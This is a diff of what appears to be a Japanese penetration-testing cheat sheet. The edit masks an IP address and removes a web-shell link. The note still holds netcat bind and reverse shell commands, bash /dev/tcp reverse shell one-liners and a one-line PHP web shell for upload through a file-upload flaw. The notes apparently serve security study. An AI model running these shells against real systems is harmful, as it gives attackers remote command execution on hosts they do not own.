@@ -35,7 +35,7 @@
   * アウトバウンド通信は許可されている場合が多いためリバースシェルはファイアウォールを回避しやすい。
   * バインドシェル・リバースシェル netcatを使用
     1. 待ち受け　`nc -vlp 1027`
-    2. 接続     `nc -v 192.168.11.144 1027 -e /bin/bash` (/bin/bashのところはwindowsならcmd.exe)
+    2. 接続     `nc -v 192.168.XXX.XXX 1027 -e /bin/bash` (/bin/bashのところはwindowsならcmd.exe)
     3. ncがない場合の接続
        1. `bash -i >& /dev/tcp/[IPアドレス/[ポート番号] 0>&1`
        2. `bash -c 'bash -i >& /dev/tcp/[IPアドレス/[ポート番号] 0>&1'`
@@ -49,5 +49,3 @@
     1. 入力を待ち受けできるphpファイルを作成しFile Uploadの脆弱性を利用しアップロード
     2. アップしたphpファイルを利用してweb経由でコマンド実行
         `<?php system($_GET["cmd"]); ?>`
-    3. 高級webシェル
-   　　[コンソールみたいなwebシェル](https://github.com/eb3095/php-shell/tree/master/php-shell.php)
